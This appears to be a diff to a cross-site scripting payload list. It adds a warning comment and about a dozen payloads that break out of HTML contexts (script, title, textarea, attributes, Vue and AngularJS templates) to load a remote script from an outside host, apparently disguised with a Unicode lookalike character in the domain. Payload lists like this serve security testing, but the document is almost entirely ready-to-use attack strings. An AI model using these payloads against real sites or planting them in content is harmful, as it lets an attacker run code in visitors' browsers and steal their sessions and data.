@@ -1,3 +1,10 @@
+<!--
+/!\\ WARNING /!\\
+This file contains active, executable payloads.
+It is designed for security testing purposes only.
+Opening this file in a browser may compromise your system.
+PROCEED WITH CAUTION.
+-->
 <noscript><p title =" </noscript> <img src=x onerror=alert(document.domain);//“>
 
 
@@ -34,3 +41,32 @@ Create Element
 javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.hackeronce.com\';document.body.appendChild(a)')
 Plain JS
 document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.hackeronce.com'}));
+
+<!-- Payloads with Jules's domain -->
+
+SCRIPT src with closing tag
+"></script></title></textarea>”/><script src=//1.㏊ckeronce.com/jules></script>
+SCRIPT src with closing and opening tag
+"></script></title></textarea>”/>"><script src=//1.㏊ckeronce.com/jules></script>
+SCRIPT src with closing and opening tag and x=
+"></script></title></textarea>”/>"><script src=//1.㏊ckeronce.com/jules></script><x="
+jQuery
+"></script></title></textarea>”/>$.getScript("//1.㏊ckeronce.com/jules")
+IMG onerror with closing tag
+"></script></title></textarea>”/>"><img src onerror=import('//1.㏊ckeronce.com/jules')>
+IMG onerror no spaces with closing tag
+"></script></title></textarea>”/>"><img/src/onerror=import('//1.㏊ckeronce.com/jules')>
+SVG script with closing tag
+"></script></title></textarea>”/>"><svg><script href=//1.㏊ckeronce.com/jules />
+SVG onload with closing tag
+"></script></title></textarea>”/>"><svg/onload=import('//1.㏊ckeronce.com/jules')>
+Link based URI payload
+"></script></title></textarea>”/>javascript:import('//1.㏊ckeronce.com/jules')
+VueJS v3
+"></script></title></textarea>”/>{{_openBlock.constructor('import("//1.㏊ckeronce.com/jules")')()}}
+VueJS v2 AngularJS
+"></script></title></textarea>”/>{{constructor.constructor('import("//1.㏊ckeronce.com/jules")')()}}
+Create Element
+"></script></title></textarea>”/>javascript:eval('var a=document.createElement(\'script\');a.src=\'//1.㏊ckeronce.com/jules\';document.body.appendChild(a)')
+Plain JS
+"></script></title></textarea>”/>document.head.appendChild(Object.assign(document.createElement('script'),{src:'//1.㏊ckeronce.com/jules'}));
